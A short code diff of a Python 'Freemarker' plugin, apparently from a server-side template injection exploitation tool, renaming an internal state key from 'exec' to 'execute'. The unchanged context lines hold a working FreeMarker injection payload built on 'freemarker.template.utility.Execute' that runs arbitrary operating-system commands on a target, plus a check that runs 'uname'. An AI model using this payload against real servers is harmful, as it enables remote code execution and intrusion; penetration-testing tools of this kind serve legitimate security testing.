@@ -38,7 +38,7 @@ class Freemarker(Plugin):
         expected_rand = str(rand.randint_n(2))
 
         if expected_rand == self.execute('echo %s' % expected_rand):
-            self.set('exec', True)
+            self.set('execute', True)
             # TODO: manage Window environment
             self.set('os', self.execute("uname"))
 
@@ -48,7 +48,7 @@ class Freemarker(Plugin):
         return self.inject("""<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("%s") }""" % (quote(command)))
 
     def detect_write(self):
-        if self.get('exec'):
+        if self.get('execute'):
             self.set('write', True)
 
     def write(self, data, remote_path):
@@ -80,7 +80,7 @@ class Freemarker(Plugin):
             return md5_extracted[0]
 
     def detect_read(self):
-        if self.get('exec'):
+        if self.get('execute'):
             self.set('read', True)
 
     def read(self, remote_path):
